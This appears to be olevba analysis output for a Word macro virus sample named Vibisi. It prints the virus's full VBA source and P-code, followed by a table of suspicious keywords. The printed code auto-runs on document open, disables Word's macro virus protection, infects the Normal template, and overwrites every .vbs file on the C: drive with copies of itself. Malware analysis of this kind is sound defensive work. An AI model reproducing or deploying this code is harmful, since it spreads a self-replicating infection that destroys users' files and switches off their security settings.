olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Vibisi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Vibisi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vbs.bas 
in file: ./Virus.MSWord.Vibisi - OLE stream: 'Macros/VBA/vbs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vibisi()
On Error Resume Next
Dim fso, f, wo

Set fso = CreateObject("scripting.filesystemobject")
Set f = fso.opentextfile(wscript.scriptfullname, 1)

Code = f.readall

Set wo = CreateObject("word.application")

With wo.Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "*.vbs"
        .Execute
End With

Set f = Nothing

For i = 1 To wo.Application.FileSearch.FoundFiles.Count
        Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True)
        f.writeline Code
Next

wo.Options.VirusProtection = (Rnd * 0)
wo.Options.SaveNormalPrompt = (Rnd * 0)

wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs"
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1
wo.NormalTemplate.Save
wo.Quit

End Sub

Sub autoopen()
On Error Resume Next

Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)

ThisDocument.VBProject.VBComponents("vbs").Export "c:\scriptO8.ini"

If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini"

If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then
        ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini"
        ActiveDocument.SaveAs ActiveDocument.FullName
End If

With Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "*.vbs"
        .Execute
End With

For x = 1 To Application.FileSearch.FoundFiles.Count
        Set fso = CreateObject("scripting.filesystemobject")
        Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True)
        codex = "call vibisi" & Chr(13) & ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(1, ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines)
        f.write codex
Next

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Vibisi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/vbs - 3666 bytes
' Line #0:
' 	FuncDefn (Sub vibisi())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn fso
' 	VarDefn False
' 	VarDefn wo
' Line #3:
' Line #4:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' Line #5:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0001 
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0002 
' 	Set False 
' Line #6:
' Line #7:
' 	Ld False 
' 	MemLd readall 
' 	St Code 
' Line #8:
' Line #9:
' 	SetStmt 
' 	LitStr 0x0010 "word.application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wo 
' Line #10:
' Line #11:
' 	StartWithExpr 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	With 
' Line #12:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #13:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #14:
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' Line #15:
' 	ArgsMemCallWith Execute 0x0000 
' Line #16:
' 	EndWith 
' Line #17:
' Line #18:
' 	SetStmt 
' 	LitNothing 
' 	Set False 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #21:
' 	SetStmt 
' 	Ld i 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' Line #22:
' 	Ld Code 
' 	Ld False 
' 	ArgsMemCall writeline 0x0001 
' Line #23:
' 	StartForVariable 
' 	Next 
' Line #24:
' Line #25:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld wo 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #26:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld wo 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #27:
' Line #28:
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #29:
' 	LitStr 0x0003 "vbs"
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #30:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #31:
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #32:
' 	Ld wo 
' 	ArgsMemCall Quit 0x0000 
' Line #33:
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Sub autoopen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' Line #39:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #40:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #41:
' Line #42:
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' Line #44:
' 	LitStr 0x0003 "vbs"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #45:
' Line #46:
' 	LitStr 0x0003 "vbs"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' 	EndIfBlock 
' Line #50:
' Line #51:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #52:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #53:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #54:
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' Line #55:
' 	ArgsMemCallWith Execute 0x0000 
' Line #56:
' 	EndWith 
' Line #57:
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #59:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' Line #60:
' 	SetStmt 
' 	Ld x 
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' Line #61:
' 	LitStr 0x000B "call vibisi"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St codex 
' Line #62:
' 	Ld codex 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' Line #63:
' 	StartForVariable 
' 	Next 
' Line #64:
' Line #65:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

